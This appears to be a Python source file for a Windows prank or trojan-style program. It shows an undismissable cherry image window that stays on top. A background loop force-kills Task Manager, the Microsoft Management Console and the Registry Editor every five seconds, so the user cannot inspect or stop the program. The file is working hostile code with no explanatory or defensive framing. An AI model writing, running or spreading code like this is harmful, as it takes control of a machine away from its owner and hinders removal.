import customtkinter
from PIL import Image
import os
import threading
import time

assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")

def cherry_window():
    top = customtkinter.CTk()
    top.title("cherry")
    top.geometry("144x144")

    cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')), size=(144,144))

    label = customtkinter.CTkLabel(top, image=cherry, text="", height=144)
    label.grid(row=0, column=0, sticky="nsew")

    top.attributes("-topmost", True)
    top.attributes("-disabled", True)

    top.mainloop()

def blocked_apps():
	while True:
		time.sleep(5)
		os.system('tasklist | findstr /i "mmc.exe" && taskkill /f /im mmc.exe')
		os.system('tasklist | findstr /i "Taskmgr.exe" && taskkill /f /im Taskmgr.exe')
		os.system('tasklist | findstr /i "regedit.exe" && taskkill /f /im regedit.exe')

block_apps_thread = threading.Thread(target=blocked_apps)
block_apps_thread.start()

cherry_window()